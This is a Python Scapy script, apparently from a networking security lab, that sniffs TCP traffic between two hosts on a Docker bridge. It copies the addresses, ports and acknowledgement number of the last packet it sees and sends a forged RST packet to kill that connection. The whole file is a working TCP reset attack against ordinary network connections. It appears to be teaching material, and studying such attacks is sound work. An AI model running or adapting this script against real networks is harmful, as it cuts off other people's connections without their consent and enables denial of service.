#!/usr/bin/env python3

import sys
from scapy.all import *

interface = 'br-dfb1dc5953e4'

def print_info(src, dst, sport, dport, seq):
    print(src)
    print(str(dst))
    print(sport)
    print(dport)
    print(seq)

def spoof_rst(src, dst, sport, dport, seq):
    ip  = IP(src = src, dst = dst)
    tcp = TCP(sport = sport, dport = dport, flags = "R", seq = seq)
    pkt = ip/tcp

    ls(pkt)
    send(pkt, verbose = 0)

src   = 0
dst   = 0
sport = 0
dport = 0
ack   = 0

def latest_packet_info(pkt):
    global src
    global dst
    global sport
    global dport
    global ack

    src = pkt[IP].dst
    dst = pkt[IP].src
    sport = pkt[TCP].dport
    dport = pkt[TCP].sport
    ack   = pkt[TCP].ack

    print("********************************")
    print_info(src, dst, sport, dport, ack)
    print("********************************")
    
sniff(iface = interface, filter="tcp and host 10.9.0.5 and host 10.9.0.6", prn = latest_packet_info, timeout = 10)

spoof_rst(src, dst, sport, dport, ack)
